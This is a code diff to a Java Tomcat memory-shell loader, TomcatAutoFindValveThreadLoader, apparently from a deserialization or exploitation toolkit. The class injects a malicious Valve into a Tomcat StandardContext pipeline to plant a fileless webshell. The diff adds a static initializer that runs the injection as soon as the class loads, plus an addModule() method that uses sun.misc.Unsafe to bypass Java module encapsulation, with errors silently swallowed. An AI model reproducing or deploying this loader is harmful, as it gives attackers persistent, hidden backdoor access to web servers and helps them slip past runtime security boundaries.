@@ -5,6 +5,7 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -22,7 +23,9 @@ import java.util.zip.GZIPInputStream;
 public class TomcatAutoFindValveThreadLoader {
     private static String gzipObject;
     private static String CLASSNAME;
-
+    static {
+        new TomcatAutoFindValveThreadLoader();
+    }
     public TomcatAutoFindValveThreadLoader() {
         try {
             // 获取 standardContext
@@ -39,6 +42,7 @@ public class TomcatAutoFindValveThreadLoader {
 
     public static void inject(Object standardContext) {
         try {
+            addModule();
             Object pipeline = getFieldValue(standardContext, "pipeline");
             Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", new Class[]{}, new Object[]{});
             for (Object valve : valves) {
@@ -309,6 +313,24 @@ public class TomcatAutoFindValveThreadLoader {
         }
 
         return null;
+    }
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = TomcatAutoFindValveThreadLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
     }
 
 }
